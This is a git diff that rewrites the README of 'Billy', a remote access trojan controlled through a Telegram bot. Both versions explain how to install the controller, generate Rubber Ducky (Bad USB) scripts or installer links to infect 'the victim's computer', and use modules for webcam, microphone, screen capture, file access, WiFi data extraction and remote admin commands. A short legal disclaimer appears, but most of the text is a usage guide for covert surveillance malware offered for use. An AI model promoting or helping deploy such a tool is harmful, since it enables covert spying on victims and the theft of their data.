@@ -3,89 +3,77 @@
 </p>
 
 # Billy
-**Billy** - Software for using the remote access trojan Billy. Billy supports Linux and Windows OS. You can control Billy with Telegram bot!
+**Billy** — Remote Access Trojan (RAT) management tool with Telegram bot integration. Supports Linux and Windows.
 
+> ⚠️ **Legal Disclaimer**
+> This project is intended **only for authorized penetration testing and educational purposes**. Unauthorized use is illegal. The author is not responsible for misuse.
 
-> ⚠️ **Attention!**  
-> The project is developed only for legal pentesting and the author is not responsible for illegal use.
+---
 
+## 📌 Features
+- **Cross-platform**: Control victims on Linux and Windows.
+- **Telegram Bot**: Manage access remotely via Telegram.
+- **Multiple Vectors**: Deploy via Rubber Ducky (Bad USB) or Installer.
+- **Modules**:
+  - 📸 Camera/Screen Capture
+  - 🎤 Microphone Recording
+  - 📁 File System Access
+  - 🌐 Network/WiFi Data Extraction
+  - ⚡ Admin Command Execution
 
-## Content
-- [Installation](#installation)
-- [Usage](#usage)
-- [Getting started](#getting-started)
-- [Modes](#modes)
-- [Structure](#structure)
-- [Screenshots](#screenshots)
-- [To do](#to-do)
-- [Thanks](#thanks)
-- [Sources](#sources)
+[▶️ Full Capabilities Table](#supported-functions)
 
+---
 
-## Installation
+## 🛠️ Installation
 ### Linux
-```
+```bash
 sudo apt install portaudio19-dev python3-tk python3-dev
 pip install -r requirements-linux.txt
 ```
+
 ### Windows
-```
+```bash
 pip install -r requirements-windows.txt
 ```
 
+---
 
-## Usage
-Run Billy.py with python:
-```
-python Billy.py
-```
+## 🚀 Quick Start
+1. Run the tool:
+   ```bash
+   python Billy.py
+   ```
+2. **Add a Branch**: Select `Add branch` to generate:
+   - 🦆 Rubber Ducky payload script
+   - 📥 Installer download link
+3. Deploy the payload to the target device.
 
+---
 
-## Getting started
-When you run Billy.py, a menu with commands will open.
-1) Get branches
-2) Add branch
-3) Delete branch
-4) Edit OAuth-token
-5) Manage branch
-6) Change compile commands
-7) Exit
+## 📋 Menu Modes
+| Mode                        | Description                                 |
+|-----------------------------|---------------------------------------------|
+| **Get branches**            | List all Yandex Drive branches.             |
+| **Add branch**              | Create a new branch (victim session).       |
+| **Delete branch**           | Remove a branch.                            |
+| **Edit OAuth-token**        | Update Yandex Drive API token.              |
+| **Manage branch**           | Edit bot token for the branch, add comment. |
+| **Change compile commands** | Customize build commands for payloads.      |
+| **About**                   | Get author and version.                     |
 
-For the first action, you need to add the first branch. Select the second mode.
-After creating the first branch, you will get the Rubber Ducky script and the URL for the Installer file.
-Now you can install the Billy remote access trojan to the victim's computer using Bad USB (Rubber Ducky script) or the Installer.
+---
 
+## 📸 Screenshots
+| **Main Menu** | **Branch Management** |
+|--------------|----------------------|
+| <img width="481" height="356" alt="Menu" src="https://github.com/serabobina/Billy/blob/main/data/screenshot1.png"/> | <img width="481" height="356" alt="Branches" src="https://github.com/serabobina/Billy/blob/main/data/screenshot3.png"/> |
 
-## Modes
-### Get branches
- - This mode allows you to get a list of the branches on your Yandex drive.
-### Add branch
- - This mode allows you to add new branch.
-### Delete branch
- - This mode allows you to delete branch.
-### Edit OAuth-token
- - This mode allows you to edit Yandex OAuth token in session.
-### Change compile commands
- - This mode allows you to replace compile commands. The commands should compile the Installer and Billy into the dist/ directory in the project root. Linux: dist/Billy and dist/Installer, Windows: dist/Billy.exe and dist/Installer.exe.
+---
 
-
-## Structure
-The project consists of tool for managing the branch system and the remote access trojan "Billy".
-
-
-## Screenshots
-### Get branches
-<img width="481" height="356" alt="Billy4" src="https://github.com/serabobina/Billy/blob/main/data/screenshot3.png" />
-
-### Menu
-<img width="481" height="356" alt="Billy2" src="https://github.com/serabobina/Billy/blob/main/data/screenshot1.png" />
-
-### Admin
-<img width="364" height="195" alt="Billy3" src="https://github.com/serabobina/Billy/blob/main/data/screenshot2.png" />
-
-
-## Functions of the remote access trojan Billy
-|  | Linux  | Windows |
+## 🔧 Technical Details
+### Supported Functions
+| Module | Linux  | Windows |
 | ------------- | ------------- | ------------- |
 | Admin | ✅ | ✅ |
 | Camera | ✅ | ✅ |
@@ -101,24 +89,24 @@ The project consists of tool for managing the branch system and the remote acces
 | Command | ✅ | ✅ |
 | About | ✅ | ✅ |
 
+### Common Errors
+| Error                          | Solution                                  |
+|--------------------------------|------------------------------------------|
+| `PyInstaller not found`        | Change compile commands to `python -m PyInstaller ...` or install PyInstaller globally. |
 
-## Compiling errors
-| Error | Cause | Solution |
-|----------------------|----------------------------------|-----------------------------|
-| Command not found: "PyInstaller" | PyInstaller is not installed globally | Install PyInstaller globaly or edit compile command with absolute path to PyInstaller(python -m PyInstaller ) |
+---
 
+## 📜 To-Do
+- [ ] Add CLI argument support
+- [ ] Expand Linux keylogging
 
-## To do
-- [x] Add a README
-- [ ] Add support for command line arguments
+---
 
+## 📜 License
+Educational use only. No warranties provided.
 
-## Thanks
-- serabobina — author
+---
 
-
-## Sources
-- [Yandex drive](https://disk.yandex.ru/)
-- [Colorama](https://super-devops.readthedocs.io/en/latest/misc.html)
-- [Art](https://pypi.org/project/art/)
-- [Readme sample](https://gist.github.com/bzvyagintsev/0c4adf4403d4261808d75f9576c814c2)
+## 🙏 Credits
+- **Author**: [serabobina](https://github.com/serabobina)
+- **Dependencies**: [Yandex Drive API](https://disk.yandex.ru/), [Colorama](https://pypi.org/project/colorama/), [PyInstaller](https://www.pyinstaller.org/)
